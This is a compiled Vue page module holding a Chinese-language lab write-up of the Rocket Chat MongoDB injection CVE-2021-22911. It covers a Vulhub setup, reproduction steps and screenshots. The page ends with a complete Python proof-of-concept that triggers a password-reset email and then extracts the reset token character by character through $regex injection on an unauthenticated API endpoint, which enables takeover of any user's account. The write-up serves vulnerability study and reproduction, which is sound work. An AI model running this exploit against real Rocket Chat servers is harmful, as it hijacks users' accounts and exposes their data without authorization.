import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Rocket Chat是一款基于Node.js、MongoDB的开源团队聊天工具。在其3.12.1~3.13.2版本中，存在一处MongoDB注入漏洞，利用这个漏洞，攻击者可以获取用户敏感信息，甚至在服务器上执行任意命令。",-1),k=n("p",null,"这个漏洞有两种攻击方式：",-1),d=n("ul",null,[n("li",null,"未授权攻击者可以利用这个漏洞，获取任意普通用户的Password Reset Token，并通过这个Token修改其密码"),n("li",null,"普通用户可以利用这个漏洞，获取任意用户的任意信息")],-1),v=n("p",null,"参考链接：",-1),m={href:"https://blog.sonarsource.com/nosql-injections-in-rocket-chat",target:"_blank",rel:"noopener noreferrer"},b={href:"https://www.exploit-db.com/exploits/50108",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/CsEnox/CVE-2021-22911",target:"_blank",rel:"noopener noreferrer"},h={href:"https://paper.seebug.org/1652/",target:"_blank",rel:"noopener noreferrer"},_=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Rocket Chat 3.12.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:3000</code>即可查看到Rocket Chat的安装向导，跟随向导进行安装即可。</p><p>安装完成后，为了验证第一个攻击方法，我们需要在后台增加一个普通用户，用户名为<code>vulhub</code>，邮箱为<code>vulhub@vulhub.org</code>。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>我们只来复现第一种利用方式。复现这个漏洞需要三步：</p><ol><li>通过邮箱找回密码，后台会在数据库中会生成Password Reset Token</li><li>利用MongoDB注入，获取这个Password Reset Token</li><li>使用Password Reset Token来更改这个用户的密码</li></ol><p>其中，我们使用<code>$regex</code>语句进行MongoDB注入，当<code>$regex: ^7</code>时，不匹配，返回一个错误信息：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230418153358039.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当<code>$regex: ^8</code>时能够匹配，返回正确信息：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230418153405408.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),f={href:"https://github.com/vulhub/vulhub/blob/master/rocketchat/CVE-2021-22911/CVE-2021-22911.py",target:"_blank",rel:"noopener noreferrer"},y=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/image-20230418153413172.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),w=n("p",null,"使用Password Reset Token修改用户密码成功：",-1),x=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/image-20230418153421489.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),C=n("h2",{id:"漏洞poc",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞poc","aria-hidden":"true"},"#"),s(" 漏洞POC")],-1),E={href:"https://github.com/vulhub/vulhub/blob/master/rocketchat/CVE-2021-22911/CVE-2021-22911.py",target:"_blank",rel:"noopener noreferrer"},V=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> string
<span class="token keyword">import</span> json
<span class="token keyword">import</span> requests


guess <span class="token operator">=</span> <span class="token string">&#39;-_&#39;</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">reset_password</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> email<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;msg&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;method&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;method&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sendForgotPasswordEmail&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;params&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>email<span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">/api/v1/method.callAnon/sendForgotPasswordEmail&#39;</span></span><span class="token punctuation">,</span>
        json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">:</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;[+] Password Reset Email Sent\\n&quot;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">inject_token</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;msg&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;method&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;method&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;getPasswordPolicy&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;params&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">{</span>
                <span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">&#39;$regex&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;^&#39;</span><span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        current <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">&#39;params&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;$regex&#39;</span><span class="token punctuation">]</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;[*] Guess No.</span><span class="token interpolation"><span class="token punctuation">{</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string"> character: &#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> guess<span class="token punctuation">:</span>
            payload<span class="token punctuation">[</span><span class="token string">&#39;params&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;$regex&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> current <span class="token operator">+</span> ch
            response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
                <span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">/api/v1/method.callAnon/getPasswordPolicy&#39;</span></span><span class="token punctuation">,</span>
                json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">:</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">b&#39;Meteor.Error&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;\\n[+] Current token is </span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">[</span><span class="token string">&#39;params&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;$regex&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token format-spec">]</span><span class="token punctuation">}</span></span><span class="token string">\\n&quot;</span></span><span class="token punctuation">)</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span>
                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    reset_password<span class="token punctuation">(</span>target<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    inject_token<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function P(R,j){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,k,d,v,n("ul",null,[n("li",null,[n("a",m,[s("https://blog.sonarsource.com/nosql-injections-in-rocket-chat"),t(a)])]),n("li",null,[n("a",b,[s("https://www.exploit-db.com/exploits/50108"),t(a)])]),n("li",null,[n("a",g,[s("https://github.com/CsEnox/CVE-2021-22911"),t(a)])]),n("li",null,[n("a",h,[s("https://paper.seebug.org/1652/"),t(a)])])]),_,n("p",null,[s("将注入的过程通过"),n("a",f,[s("CVE-2021-22911.py"),t(a)]),s("这个小脚本进行实现，自动化获取Password Reset Token：")]),y,w,x,C,n("ul",null,[n("li",null,[n("a",E,[s("https://github.com/vulhub/vulhub/blob/master/rocketchat/CVE-2021-22911/CVE-2021-22911.py"),t(a)])])]),V])}const q=e(l,[["render",P],["__file","Rocket Chat MongoDB 注入漏洞 CVE-2021-22911.html.vue"]]);export{q as default};
